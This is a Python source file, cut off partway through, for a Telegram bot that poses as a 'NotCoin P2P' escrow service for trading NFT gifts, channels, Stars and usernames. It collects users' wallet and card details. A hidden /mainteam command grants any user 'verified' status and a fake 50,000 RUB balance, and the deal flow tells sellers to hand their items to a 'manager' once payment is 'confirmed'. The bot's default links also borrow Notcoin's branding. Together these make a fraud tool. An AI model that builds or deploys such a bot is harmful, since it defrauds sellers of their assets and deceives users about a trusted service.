"""Telegram P2P bot. Uses only Python's standard library."""

import html
import json
import logging
import os
import sqlite3
import time
import secrets
import mimetypes
from decimal import Decimal, InvalidOperation, ROUND_HALF_UP
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen


def config_value(name):
    value = os.environ.get(name)
    if value is not None:
        return value.strip()
    path = Path(__file__).with_name(".env")
    if path.is_file():
        for line in path.read_text(encoding="utf-8").splitlines():
            if line.lstrip().startswith("#") or "=" not in line:
                continue
            key, value = line.split("=", 1)
            if key.strip() == name:
                return value.strip().strip('"').strip("'")
    return ""


TOKEN = config_value("BOT_TOKEN")
DB_PATH = Path(os.environ.get("BOT_DB_PATH", Path(__file__).with_name("bot.sqlite3")))
EMOJI_SET = "theopenemojis"
LANGUAGES = {
    "ru": "Русский 🇷🇺",
    "en": "English 🇬🇧",
    "zh": "中文 🇨🇳",
}
PROMPTS = {
    "ru": "Выберите язык интерфейса",
    "en": "Choose the interface language",
    "zh": "请选择界面语言",
}
SELECTED = {
    "ru": "Язык интерфейса: русский.",
    "en": "Interface language: English.",
    "zh": "界面语言：中文。",
}
WELCOME = {
    "ru": "Добро пожаловать 👋\n\n💼 NotCoin P2P - Мы специализированный сервис по обеспечению безопасности вне биржевых сделок.\nУдобный и быстрый вывод средств.\n\n• Комиссия сервиса: 1%\n• Режим работы: 24/7\n• Техническая поддержка: {support}\n\n🛡 Выберите нужный раздел ниже:",
    "en": "Welcome 👋\n\n💼 NotCoin P2P - We are a specialized service for securing OTC deals.\nConvenient and fast withdrawal.\n\n• Service commission: 1%\n• Working hours: 24/7\n• Technical support: {support}\n\n🛡 Choose a section below:",
    "zh": "欢迎 👋\n\n💼 NotCoin P2P - 我们是专业的场外交易安全服务商。\n便捷快速的资金提取。\n\n• 服务佣金：1%\n• 工作时间：24/7\n• 技术支持：{support}\n\n🛡 请在下方选择所需版块：",
}
TYPES = ["NFT-Подарок / Подарок", "Канал / чат", "Звезды", "NFT-Юзернейм / Тег", "Другое"]
METHODS = ["На TON-кошелек", "Перевод на карту / СБП", "Другие Страны", "Звезды"]
COUNTRIES = ["🇷🇺 РФ", "🇰🇿 Казахстан", "🇺🇦 Украина", "🇧🇾 Беларусь", "🇬🇪 Грузия", "🇲🇩 Молдова", "🇹🇯 Таджикистан", "🇹🇲 Туркменистан", "🇺🇿 Узбекистан", "🇰🇬 Киргизия", "🇦🇲 Армения", "🇦🇿 Азербайджан", "🇩🇪 Германия", "🇫🇷 Франция", "🇮🇹 Италия", "🇪🇸 Испания", "🇳🇱 Нидерланды", "🇧🇪 Бельгия", "🇦🇹 Австрия", "🇵🇹 Португалия", "🇫🇮 Финляндия", "🇮🇪 Ирландия", "🇬🇷 Греция", "🇸🇰 Словакия", "🇸🇮 Словения", "🇪🇪 Эстония", "🇱🇻 Латвия", "🇱🇹 Литва", "🇨🇾 Кипр", "🇲🇹 Мальта", "🇱🇺 Люксембург", "🇺🇸 США", "🇬🇧 Великобритания", "🇵🇱 Польша", "🇨🇿 Чехия", "🇭🇺 Венгрия", "🇷🇴 Румыния", "🇧🇬 Болгария", "🇭🇷 Хорватия", "🇷🇸 Сербия", "🇸🇪 Швеция", "🇳🇴 Норвегия", "🇩🇰 Дания", "🇨🇭 Швейцария", "🇮🇱 Израиль", "🇦🇪 ОАЭ", "🇹🇷 Турция", "🇨🇳 Китай", "🇯🇵 Япония", "🇰🇷 Южная Корея", "🇮🇳 Индия", "🇹🇭 Таиланд", "🇻🇳 Вьетнам", "🇧🇷 Бразилия", "🇨🇦 Канада", "🇲🇽 Мексика", "🇦🇺 Австралия"]
BOT_USERNAME = ""
SUPPORT_USERNAME = config_value("SUPPORT_USERNAME") or "Manager_P2P_Offical"
CHANNEL_URL = config_value("CHANNEL_URL") or "https://t.me/notcoin"
SUCCESS_URL = config_value("SUCCESS_URL") or "https://t.me/notgrups"
ASSET_DIR = Path(__file__).resolve().parent / "assets"
ANIMATIONS = {"welcome": ASSET_DIR / "welcome.mp4", "balance": ASSET_DIR / "balance.mp4", "deal_created": ASSET_DIR / "deal_created.mp4"}
ANIMATION_FILE_IDS = {}
PREMIUM_EMOJI = {
    "👋": "6041921818896372382", "💼": "5893255507380014983",
    "🛡": "5276262671962892944", "🛒": "5278613311858959074",
    "💸": "5208485880418820053", "💎": "5388774339623540025",
    "💳": "5902056028513505203", "❌": "5774077015388852135",
    "✅": "5774022692642492953", "📂": "6039630677182254664",
    "📜": "5363967308601501461", "💵": "5201873447554145566",
    "📌": "5397782960512444700", "⚠️": "5420323339723881652",
    "📁": "5278227821364275264", "🪙": "5388774339623540025",
}
BUTTON_ICONS = {
    "create": "5251203410396458957",
    "balance": "5215420556089776398", "language": "5334544901428229844",
    "role:seller": "5276037216244624892", "role:buyer": "5278613311858959074",
    "menu": "5330131801056768633", "withdraw": "5208485880418820053",
    "history": "5204094761689963044", "requisites": "5472250091332993630",
    "method:1": "5298614648138919107", "method:2": "5238132025323444613",
    "method:3": "5438496463044752972", "type:0": "5269416360949064906",
    "type:1": "6269303009658802514", "type:2": "5438496463044752972",
    "type:3": "5298975240708187753", "type:4": "5280920959132380213",
}
URL_ICONS = {"channel": "5424818078833715060", "success": "5264919878082509254", "support": "5238025132177369293", "share": "5271604874419647061", "manager": "5472308992514464048"}
ADMIN_IDS = {int(value) for value in config_value("ADMIN_IDS").split(",") if value.strip().isdigit()}
MANAGER_IDS = {int(value) for value in config_value("MANAGER_IDS").split(",") if value.strip().isdigit()} or ADMIN_IDS
UI = {
    "ru": {"create": "Создать сделку", "balance": "Мой баланс", "deals": "Мои сделки", "language": "Изменить язык", "back": "Вернуться в меню", "role": "🛡 Выберите вашу роль в сделке:", "seller": "Я Продавец", "buyer": "Я Покупатель", "type": "Выберите тип товара для сделки:", "method": "Выберите метод получения оплаты:", "amount": "Введите сумму в формате: 100.5", "description": "Опишите предмет сделки, условия, сроки и важные детали одним сообщением.", "mine": "Мои сделки:", "mine_empty": "У вас пока нет сделок.", "accept": "Откликнуться", "finish": "Завершить сделку", "cancel": "Отменить сделку", "requisites": "Мои реквизиты", "ton": "Добавить/изменить TON-кошелёк", "card": "Добавить/изменить карту или телефон", "history": "История операций", "withdraw": "Вывести средства"},
    "en": {"create": "Create deal", "balance": "My balance", "deals": "My deals", "language": "Change language", "back": "Back to menu", "role": "🛡 Choose your role in the deal:", "seller": "I'm a seller", "buyer": "I'm a buyer", "type": "Choose the item type:", "method": "Choose the payment method:", "amount": "Enter an amount, for example 100.5", "description": "Describe the item, terms, timing and important details in one message.", "mine": "My deals:", "mine_empty": "You have no deals yet.", "accept": "Respond", "finish": "Complete deal", "cancel": "Cancel deal", "requisites": "My payment details", "ton": "Add/change TON wallet", "card": "Add/change card or phone", "history": "Transaction history", "withdraw": "Withdraw funds"},
    "zh": {"create": "创建交易", "balance": "我的余额", "deals": "我的交易", "language": "切换语言", "back": "返回菜单", "role": "🛡 请选择您在交易中的角色：", "seller": "我是卖家", "buyer": "我是买家", "type": "请选择商品类型：", "method": "请选择付款方式：", "amount": "请输入金额，例如 100.5", "description": "请在一条消息中描述商品、交易条件、期限和重要细节。", "mine": "我的交易：", "mine_empty": "您还没有交易。", "accept": "参与交易", "finish": "完成交易", "cancel": "取消交易", "requisites": "我的收款信息", "ton": "添加或修改 TON 钱包", "card": "添加或修改银行卡或电话", "history": "交易历史", "withdraw": "提款"},
}
TYPE_LABELS = {
    "en": ["NFT gift / Gift", "Channel / chat", "Stars", "NFT username / Tag", "Other"],
    "zh": ["NFT 礼物 / 礼物", "频道 / 聊天群", "星星", "NFT 用户名 / 标签", "其他"],
}
METHOD_LABELS = {
    "en": ["TON wallet", "Bank card / phone", "Other countries", "Stars"],
    "zh": ["TON 钱包", "银行卡 / 电话", "其他国家", "星星"],
}
MESSAGES = {
    "ru": {"bad_amount": "Введите положительную сумму числом.", "bad_description": "Описание должно содержать от 5 до 1000 символов.", "bad_details": "Введите реквизиты длиной от 5 до 150 символов.", "details_saved": "✅ Реквизиты сохранены.", "created": "✅ Сделка успешно создана!\n\nСумма: {amount}\n💵 Способ расчёта: {method}\n📌 Товар: {item_type}\n⚠️ Описание: {description}\n\nСсылка для второй стороны:\n{link}\n\nОтправьте ссылку другому участнику.", "deal_missing": "Сделка не найдена.", "message_usage": "Формат: /message ID_сделки ваше сообщение", "message_received": "💬 Сообщение по сделке {id}:\n{text}", "message_sent": "Сообщение отправлено.", "active_missing": "Активная сделка не найдена.", "chat_hint": "Для переписки: /message {id} ваш текст", "cancelled": "Заявка отменена.", "unavailable": "Заявка уже недоступна.", "details_prompt": "Отправьте реквизиты одним сообщением.", "accepted": "✅ Вы откликнулись на сделку {id}.\n{hint}", "joined": "✅ На вашу сделку {id} откликнулся пользователь {user}.\n{hint}", "finish_wait": "Подтверждение сохранено. Ожидаем вторую сторону.", "finish_request": "Вторая сторона предлагает завершить сделку {id}. Подтвердите завершение в «Мои сделки».", "finished": "Сделка {id} завершена обеими сторонами."},
    "en": {"bad_amount": "Enter a positive numeric amount.", "bad_description": "The description must be 5 to 1000 characters long.", "bad_details": "Payment details must be 5 to 150 characters long.", "details_saved": "✅ Payment details saved.", "created": "✅ Deal created!\n\nAmount: {amount}\n💵 Payment method: {method}\n📌 Item: {item_type}\n⚠️ Description: {description}\n\nLink for the other participant:\n{link}\n\nSend the link to them.", "deal_missing": "Deal not found.", "message_usage": "Format: /message DEAL_ID your message", "message_received": "💬 Message about deal {id}:\n{text}", "message_sent": "Message sent.", "active_missing": "Active deal not found.", "chat_hint": "To chat: /message {id} your text", "cancelled": "Deal cancelled.", "unavailable": "Deal is no longer available.", "details_prompt": "Send your payment details in one message.", "accepted": "✅ You joined deal {id}.\n{hint}", "joined": "✅ User {user} joined your deal {id}.\n{hint}", "finish_wait": "Confirmation saved. Waiting for the other participant.", "finish_request": "The other participant wants to complete deal {id}. Confirm it in My deals.", "finished": "Deal {id} was completed by both participants."},
    "zh": {"bad_amount": "请输入大于零的数字金额。", "bad_description": "描述长度应为 5 到 1000 个字符。", "bad_details": "收款信息长度应为 5 到 150 个字符。", "details_saved": "✅ 收款信息已保存。", "created": "✅ 交易已创建！\n\n金额：{amount}\n💵 付款方式：{method}\n📌 商品：{item_type}\n⚠️ 描述：{description}\n\n给另一方的链接：\n{link}\n\n请将链接发送给对方。", "deal_missing": "未找到交易。", "message_usage": "格式：/message 交易ID 您的消息", "message_received": "💬 交易 {id} 的消息：\n{text}", "message_sent": "消息已发送。", "active_missing": "未找到进行中的交易。", "chat_hint": "聊天：/message {id} 您的消息", "cancelled": "交易已取消。", "unavailable": "交易已不可用。", "details_prompt": "请用一条消息发送收款信息。", "accepted": "✅ 您已参与交易 {id}。\n{hint}", "joined": "✅ 用户 {user} 参与了您的交易 {id}。\n{hint}", "finish_wait": "已保存确认，等待对方。", "finish_request": "对方希望完成交易 {id}。请在“我的交易”中确认。", "finished": "交易 {id} 已由双方确认完成。"},
}


def say(language, key, **values):
    return MESSAGES.get(language, MESSAGES["ru"])[key].format(**values)


def label(language, key):
    return UI.get(language, UI["ru"])[key]


def type_label(language, index):
    return (TYPE_LABELS.get(language) or TYPES)[index]


def method_label(language, index):
    return (METHOD_LABELS.get(language) or METHODS)[index]


def api(method, payload=None, timeout=45):
    data = json.dumps(payload or {}, ensure_ascii=False).encode("utf-8")
    request = Request(
        f"https://api.telegram.org/bot{TOKEN}/{method}",
        data=data,
        headers={"Content-Type": "application/json; charset=utf-8"},
    )
    with urlopen(request, timeout=timeout) as response:
        result = json.load(response)
    if not result.get("ok"):
        raise RuntimeError(f"Telegram {method}: {result.get('description', 'unknown error')}")
    return result["result"]


def api_multipart(method, fields, file_field, file_path, timeout=120):
    boundary = "CodexBoundary" + secrets.token_hex(12)
    body = bytearray()
    for key, value in fields.items():
        if isinstance(value, (dict, list)):
            value = json.dumps(value, ensure_ascii=False)
        body.extend(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{key}\"\r\n\r\n{value}\r\n".encode("utf-8"))
    filename = file_path.name
    content_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"
    body.extend(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; filename=\"{filename}\"\r\nContent-Type: {content_type}\r\n\r\n".encode("utf-8"))
    body.extend(file_path.read_bytes())
    body.extend(f"\r\n--{boundary}--\r\n".encode("utf-8"))
    request = Request(f"https://api.telegram.org/bot{TOKEN}/{method}", data=bytes(body), headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    with urlopen(request, timeout=timeout) as response:
        result = json.load(response)
    if not result.get("ok"):
        raise RuntimeError(f"Telegram {method}: {result.get('description', 'unknown error')}")
    return result["result"]


def connect_db():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    connection = sqlite3.connect(DB_PATH)
    connection.execute(
        "CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, language TEXT NOT NULL)"
    )
    if "verified" not in {column[1] for column in connection.execute("PRAGMA table_info(users)")}:
        connection.execute("ALTER TABLE users ADD COLUMN verified INTEGER NOT NULL DEFAULT 0")
    connection.execute("CREATE TABLE IF NOT EXISTS drafts (user_id INTEGER PRIMARY KEY, stage TEXT NOT NULL, data TEXT NOT NULL)")
    connection.execute("CREATE TABLE IF NOT EXISTS deals (id TEXT PRIMARY KEY, creator_id INTEGER NOT NULL, buyer_id INTEGER, role TEXT NOT NULL, item_type TEXT NOT NULL, method TEXT NOT NULL, amount TEXT NOT NULL, description TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'open')")
    if "payment_details" not in {column[1] for column in connection.execute("PRAGMA table_info(deals)")}:
        connection.execute("ALTER TABLE deals ADD COLUMN payment_details TEXT")
    connection.execute("CREATE TABLE IF NOT EXISTS finish_votes (deal_id TEXT NOT NULL, user_id INTEGER NOT NULL, PRIMARY KEY (deal_id, user_id))")
    connection.execute("CREATE TABLE IF NOT EXISTS requisites (user_id INTEGER PRIMARY KEY, ton_wallet TEXT, card_or_phone TEXT)")
    connection.execute("CREATE TABLE IF NOT EXISTS usernames (user_id INTEGER PRIMARY KEY, username TEXT NOT NULL)")
    connection.execute("CREATE TABLE IF NOT EXISTS balance_events (id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL, currency TEXT NOT NULL, amount TEXT NOT NULL, source TEXT NOT NULL UNIQUE)")
    connection.commit()
    DB_PATH.chmod(0o600)
    return connection


def get_language(connection, user_id):
    row = connection.execute(
        "SELECT language FROM users WHERE user_id = ?", (user_id,)
    ).fetchone()
    return row[0] if row else None


def remember_user(connection, user):
    user_id = user.get("id")
    if not user_id:
        return
    username = user.get("username")
    if username:
        connection.execute("INSERT INTO usernames (user_id, username) VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET username=excluded.username", (user_id, username))
        connection.commit()


def user_name(connection, user_id):
    row = connection.execute("SELECT username FROM usernames WHERE user_id=?", (user_id,)).fetchone()
    return f"@{row[0]}" if row and row[0] else f"#{user_id}"


def set_language(connection, user_id, language):
    connection.execute(
        "INSERT INTO users (user_id, language) VALUES (?, ?) "
        "ON CONFLICT(user_id) DO UPDATE SET language = excluded.language",
        (user_id, language),
    )
    connection.commit()


def is_admin(user_id):
    return user_id in ADMIN_IDS


def is_manager(user_id):
    return user_id in MANAGER_IDS


def balance(connection, user_id, currency="RUB"):
    rows = connection.execute("SELECT amount FROM balance_events WHERE user_id=? AND currency=?", (user_id, currency)).fetchall()
    return sum((Decimal(row[0]) for row in rows), Decimal(0))


def currency_for(method):
    if method == "На TON-кошелек":
        return "TON"
    if method == "Звезды":
        return "Stars"
    return "RUB"


def parties(deal):
    creator, responder = deal[1], deal[2]
    return (creator, responder) if deal[3] == "seller" else (responder, creator)


def grant_mainteam(connection, user_id):
    """Grant each user their one-time MainTeam credit and verification."""
    with connection:
        connection.execute("INSERT OR IGNORE INTO users (user_id, language) VALUES (?, 'ru')", (user_id,))
        connection.execute("UPDATE users SET verified=1 WHERE user_id=?", (user_id,))
        added = connection.execute("INSERT OR IGNORE INTO balance_events (user_id, currency, amount, source) VALUES (?, 'RUB', '50000.00', ?)", (user_id, f"mainteam:{user_id}")).rowcount
    return bool(added)


def load_custom_emoji():
    """Find a globe in the requested emoji set, or use its first emoji."""
    try:
        stickers = api("getStickerSet", {"name": EMOJI_SET})["stickers"]
    except (HTTPError, URLError, RuntimeError, OSError, KeyError) as error:
        logging.warning("Could not load emoji set %s: %s", EMOJI_SET, error)
        return None
    for wanted in ("🌐", "🌍", "🌎", "🌏"):
        for sticker in stickers:
            if sticker.get("emoji") == wanted and sticker.get("custom_emoji_id"):
                return sticker["custom_emoji_id"]
    return next((s["custom_emoji_id"] for s in stickers if s.get("custom_emoji_id")), None)


def language_keyboard():
    return {"inline_keyboard": [
        [{"text": label, "callback_data": f"lang:{code}", "style": "success"}]
        for code, label in LANGUAGES.items()
    ]}


def keyboard(rows):
    output = []
    for row in rows:
        buttons = []
        for label_text, data in row:
            button = {"text": label_text}
            if data.startswith("https://"):
                button["url"] = data
                kind = "manager" if label_text == "Передать Товар Менеджеру" else "channel" if data == CHANNEL_URL else "success" if data == SUCCESS_URL else "support" if data == f"https://t.me/{SUPPORT_USERNAME}" else "share" if data.startswith("https://t.me/share/url?") else "manager"
                button["style"] = "primary" if kind == "manager" else "success"
                button["icon_custom_emoji_id"] = URL_ICONS[kind]
            else:
                button["callback_data"] = data
                button["style"] = "danger" if data == "menu" or data.startswith("cancel:") else "success"
                icon = None if label_text == "Выйти со сделки" else BUTTON_ICONS.get(data)
                if data.startswith("transfer:"):
                    icon = "5199749070830197566"
                if icon:
                    button["icon_custom_emoji_id"] = icon
            buttons.append(button)
        output.append(buttons)
    return {"inline_keyboard": output}


def premium_html(value, bold=(), blockquotes=()):
    rendered = html.escape(value)
    for phrase in blockquotes:
        escaped = html.escape(phrase)
        rendered = rendered.replace(escaped, f"<blockquote>{escaped}</blockquote>", 1)
    for phrase in bold:
        escaped = html.escape(phrase)
        rendered = rendered.replace(escaped, f"<b>{escaped}</b>", 1)
    for glyph, emoji_id in PREMIUM_EMOJI.items():
        rendered = rendered.replace(glyph, f'<tg-emoji emoji-id="{emoji_id}">{glyph}</tg-emoji>')
    return rendered


def send(chat_id, text, rows=None, animation=None, bold=(), blockquotes=()):
    payload = {"chat_id": chat_id, "text": premium_html(text, bold, blockquotes), "parse_mode": "HTML"}
    if rows:
        payload["reply_markup"] = keyboard(rows)
    if animation and animation in ANIMATIONS and ANIMATIONS[animation].is_file():
        caption_text = text if len(text) <= 950 else "💼"
        media_payload = {"chat_id": chat_id, "caption": premium_html(caption_text, bold if caption_text == text else (), blockquotes if caption_text == text else ()), "parse_mode": "HTML"}
        if rows and len(text) <= 950:
            media_payload["reply_markup"] = keyboard(rows)
        # Telegram captions are limited to 1024 characters after entity parsing.
        try:
            if animation in ANIMATION_FILE_IDS:
                media_payload["animation"] = ANIMATION_FILE_IDS[animation]
                result = api("sendAnimation", media_payload)
            else:
                result = api_multipart("sendAnimation", media_payload, "animation", ANIMATIONS[animation])
                file_id = (result.get("animation") or {}).get("file_id")
                if file_id:
                    ANIMATION_FILE_IDS[animation] = file_id
            if len(text) <= 950:
                return result
        except (HTTPError, URLError, RuntimeError, OSError) as error:
            logging.warning("Could not send %s animation; sending text: %s", animation, error)
    try:
        return api("sendMessage", payload)
    except (HTTPError, OSError):
        payload["text"] = text
        payload.pop("parse_mode", None)
        return api("sendMessage", payload)


def menu(chat_id, language):
    labels = {
        "ru": ("Создать сделку", "Мой баланс", "Канал", "Успешные сделки", "Изменить язык", "Поддержка"),
        "en": ("Create deal", "My balance", "Channel", "Successful deals", "Change language", "Support"),
        "zh": ("创建交易", "我的余额", "频道", "成功交易", "更改语言", "支持"),
    }[language]
    create, balance_label, channel, success, language_label, support = labels
    rows = [[(create, "create"), (balance_label, "balance")], [(channel, CHANNEL_URL), (success, SUCCESS_URL)], [(language_label, "language"), (support, f"https://t.me/{SUPPORT_USERNAME}")]]
    welcome = WELCOME[language].format(support=f"@{SUPPORT_USERNAME}")
    sections = welcome.split("\n\n")
    send(chat_id, welcome, rows, animation="welcome", blockquotes=(sections[1], sections[2]))


def send_amount_prompt(chat_id, language, method):
    currency = currency_for(method)
    if language == "ru":
        example = "1000.50" if currency == "RUB" else "100.5"
        prompt = f"💼 Создание сделки\n\nВведите сумму ({currency}) в формате: {example}"
    else:
        prompt = f"💼 {label(language, 'create')}\n\n{label(language, 'amount')} ({currency})"
    send(chat_id, prompt, [[(label(language, "back"), "menu")]], animation="balance")


def set_draft(connection, user_id, stage, data):
    connection.execute("INSERT INTO drafts VALUES (?, ?, ?) ON CONFLICT(user_id) DO UPDATE SET stage=excluded.stage, data=excluded.data", (user_id, stage, json.dumps(data, ensure_ascii=False)))
    connection.commit()


def get_draft(connection, user_id):
    row = connection.execute("SELECT stage, data FROM drafts WHERE user_id=?", (user_id,)).fetchone()
    return (row[0], json.loads(row[1])) if row else (None, None)


def clear_draft(connection, user_id):
    connection.execute("DELETE FROM drafts WHERE user_id=?", (user_id,))
    connection.commit()


def show_deal(connection, chat_id, deal, language="ru", viewer_id=None):
    deal_id, creator, buyer, role, item_type, method, amount, description, status = deal[:9]
    seller_id, actual_buyer_id = parties(deal)
    heading = {"ru": "Сделка", "en": "Deal", "zh": "交易"}[language]
    status_label = {"ru": "Статус", "en": "Status", "zh": "状态"}[language]
    statuses = {"ru": {"open": "открыта", "active": "ожидает оплаты", "payment_confirmed": "оплата подтверждена покупателем", "transfer_requested": "ожидает менеджера", "finished": "завершена", "cancelled": "отменена"}, "en": {"open": "open", "active": "awaiting payment", "payment_confirmed": "buyer confirmed payment", "transfer_requested": "awaiting manager", "finished": "completed", "cancelled": "cancelled"}, "zh": {"open": "开放", "active": "等待付款", "payment_confirmed": "买家已确认付款", "transfer_requested": "等待管理员", "finished": "已完成", "cancelled": "已取消"}}
    text = (f"💼 {heading} {deal_id}\n\n🛒 {item_type}\n💵 {amount} ({method})\n"
            f"📌 {description}\n\n{status_label}: {statuses[language].get(status, status)}")
    if status == "active" and viewer_id == actual_buyer_id and language == "ru":
        detail = f"\n💳 Карта / СБП: {deal[9]}" if len(deal) > 9 and deal[9] and currency_for(method) == "RUB" else f"\n💎 TON-кошелек: {deal[9]}" if len(deal) > 9 and deal[9] else ""
        text = (f"💳 Информация о сделке #{deal_id}\n\n👋 Вы покупатель в сделке.\n📩 Продавец: {user_name(connection, seller_id)}\n\n"
                f"📜 Вы покупаете: {description}\n\n🛒 Товар: {item_type}\n\n💼 Способ оплаты: {currency_for(method)}{detail}\nID сделки: {deal_id}\n\n\n"
                f"Сумма к оплате: {amount} {currency_for(method)}\n\nПожалуйста, следуйте инструкциям продавца по оплате.\n"
                f"Сохраните ID сделки для подтверждения!\n\nВ случае проблем с оплатой обратитесь в поддержку — https://t.me/{SUPPORT_USERNAME}")
        send(chat_id, text, [[("Подтвердить оплату", f"paid:{deal_id}")], [("Выйти со сделки", "menu")]])
        return
    rows = []
    if status == "open" and viewer_id != creator:
        rows.append([(label(language, "accept"), f"accept:{deal_id}")])
    if status == "open" and viewer_id == creator:
        rows.append([(label(language, "cancel"), f"cancel:{deal_id}")])
    if status in ("active", "payment_confirmed", "transfer_requested") and viewer_id in (creator, buyer):
        text += "\n\n" + say(language, "chat_hint", id=deal_id)
        if len(deal) > 9 and deal[9]:
            text += f"\n💳 {deal[9]}"
    if status == "active" and viewer_id == actual_buyer_id:
        rows.append([({"ru": "Подтвердить оплату", "en": "Confirm payment", "zh": "确认付款"}[language], f"paid:{deal_id}")])
    if status == "payment_confirmed" and viewer_id == seller_id:
        rows.append([({"ru": "Готово — передано менеджеру", "en": "Handed to manager", "zh": "已交给管理员"}[language], f"transfer:{deal_id}")])
    if status == "transfer_requested" and is_manager(viewer_id):
        rows.append([({"ru": "Подтвердить получение", "en": "Approve receipt", "zh": "确认收到"}[language], f"approve:{deal_id}")])
    rows.append([(label(language, "back"), "menu")])
    send(chat_id, text, rows)


def handle_text(connection, user_id, chat_id, value):
    stage, data = get_draft(connection, user_id)
    language = get_language(connection, user_id) or "ru"
    if stage == "amount":
        try:
            amount = Decimal(value.replace(",", "."))
        except InvalidOperation:
            amount = Decimal(0)
        if not amount.is_finite() or not 0 < amount <= 1_000_000_000:
            send(chat_id, say(language, "bad_amount"))
            return
        data["amount"] = format(amount.normalize(), "f")
        set_draft(connection, user_id, "description", data)
        if language == "ru":
            prompt = (f"📁 {data['item_type']}\n\nОпишите предмет сделки: что передаётся (товар, услуга, аккаунт и т.д.), условия, сроки и важные детали.\n\n"
                      "Покупатель увидит этот текст в карточке сделки.\n\nНапишите одним сообщением ниже.")
        else:
            prompt = f"📁 {data['item_type']}\n\n{label(language, 'description')}"
        send(chat_id, prompt, [[(label(language, "back"), "menu")]])
    elif stage == "description":
        description = value.strip()
        if not 5 <= len(description) <= 1000:
            send(chat_id, say(language, "bad_description"))
            return
        deal_id = secrets.token_urlsafe(7)
        connection.execute("INSERT INTO deals (id, creator_id, role, item_type, method, amount, description, payment_details) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", (deal_id, user_id, data["role"], data["item_type"], data["method"], data["amount"], description, data.get("payment_details")))
        connection.commit()
        clear_draft(connection, user_id)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        currency = currency_for(data["method"])
        if language == "ru":
            created = (f"✅ Сделка успешно создана!\n\nСумма: {data['amount']} {currency}\n💵 Валюта: {currency}\n📌 Товар: {data['item_type']}\n"
                       f"⚠️ Описание: {description}\nСсылка для покупателя:\n{link}\n\nСкопируйте ссылку и отправьте покупателю.")
        else:
            created = say(language, "created", amount=data["amount"], method=data["method"], item_type=data["item_type"], description=description, link=link)
        share_url = "https://t.me/share/url?url=" + quote(link, safe="")
        send(chat_id, created, [[("Поделиться ссылкой" if language == "ru" else "Share link" if language == "en" else "分享链接", share_url)], [(label(language, "back"), "menu")]], animation="deal_created")
    elif stage in ("ton_wallet", "card_or_phone", "country_details"):
        detail = value.strip()
        if not 5 <= len(detail) <= 150:
            send(chat_id, say(language, "bad_details"))
            return
        if stage == "country_details":
            data["payment_details"] = f"{data['country']} {detail}"
            set_draft(connection, user_id, "amount", data)
            send_amount_prompt(chat_id, language, data["method"])
        else:
            connection.execute(f"INSERT INTO requisites (user_id, {stage}) VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET {stage}=excluded.{stage}", (user_id, detail))
            connection.commit()
            if data.get("resume"):
                data["payment_details"] = detail
                data.pop("resume")
                set_draft(connection, user_id, "amount", data)
                send(chat_id, say(language, "details_saved"), animation="balance")
                send_amount_prompt(chat_id, language, data["method"])
            else:
                clear_draft(connection, user_id)
                send(chat_id, say(language, "details_saved"), [[(label(language, "back"), "menu")]], animation="balance")


def prompt_text(language, emoji_id):
    label = html.escape(PROMPTS.get(language, PROMPTS["ru"]))
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">🌐</tg-emoji> {label}'
    return f"🌐 {label}"


def show_language(chat_id, language, emoji_id):
    payload = {
        "chat_id": chat_id,
        "text": prompt_text(language, emoji_id),
        "parse_mode": "HTML",
        "reply_markup": language_keyboard(),
    }
    try:
        api("sendMessage", payload)
    except HTTPError as error:
        # Telegram may reject a custom emoji for a bot without access to it.
        if not emoji_id:
            raise
        logging.warning("Custom emoji rejected, using Unicode: %s", error)
        payload["text"] = prompt_text(language, None)
        api("sendMessage", payload)


def handle_update(connection, update, emoji_id):
    message = update.get("message")
    if message:
        user = message.get("from", {})
        user_id = user.get("id")
        chat = message.get("chat", {})
        if not user_id or chat.get("type") != "private":
            return
        remember_user(connection, user)
        value = message.get("text", "")
        command = value.split(" ", 1)[0].split("@", 1)[0]
        if command == "/language":
            show_language(chat["id"], get_language(connection, user_id) or "ru", emoji_id)
        elif command == "/mainteam":
            added = grant_mainteam(connection, user_id)
            credited = "50000.00" if added else "0.00"
            send(chat["id"], f"MainTeam активирован.\n\nСтатус: проверенный пользователь\n💸 Начислено: {credited} RUB\n💼 Баланс: {balance(connection, user_id):.2f} RUB\n\nПодтверждение оплаты доступно.")
        elif command == "/pending" and is_manager(user_id):
            pending = connection.execute("SELECT * FROM deals WHERE status='transfer_requested' ORDER BY rowid LIMIT 20").fetchall()
            send(chat["id"], "Ожидают менеджера:" if pending else "Нет ожидающих сделок.", [[(d[0], f"deal:{d[0]}")] for d in pending])
        elif command == "/deal":
            argument = value.split(" ", 1)[1].strip() if " " in value else ""
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (argument,)).fetchone()
            if deal:
                show_deal(connection, chat["id"], deal, get_language(connection, user_id) or "ru", user_id)
            else:
                send(chat["id"], say(get_language(connection, user_id) or "ru", "deal_missing"))
        elif command == "/mydeals":
            language = get_language(connection, user_id) or "ru"
            deals = connection.execute("SELECT * FROM deals WHERE creator_id=? OR buyer_id=? ORDER BY rowid DESC LIMIT 20", (user_id, user_id)).fetchall()
            send(chat["id"], label(language, "mine" if deals else "mine_empty"), [[(f"{deal[4]} — {deal[6]} ({deal[8]})", f"deal:{deal[0]}")] for deal in deals] + [[(label(language, "back"), "menu")]])
        elif command == "/requisites":
            details = connection.execute("SELECT ton_wallet, card_or_phone FROM requisites WHERE user_id=?", (user_id,)).fetchone() or (None, None)
            language = get_language(connection, user_id) or "ru"
            send(chat["id"], f"📩 {label(language, 'requisites')}\n\n💎 TON: {details[0] or '❌'}\n💳 Card / phone: {details[1] or '❌'}", [[(label(language, "ton"), "set:ton_wallet")], [(label(language, "card"), "set:card_or_phone")], [(label(language, "back"), "menu")]])
        elif command == "/start":
            argument = value.split(" ", 1)[1].strip() if " " in value else ""
            if argument.startswith("deal_"):
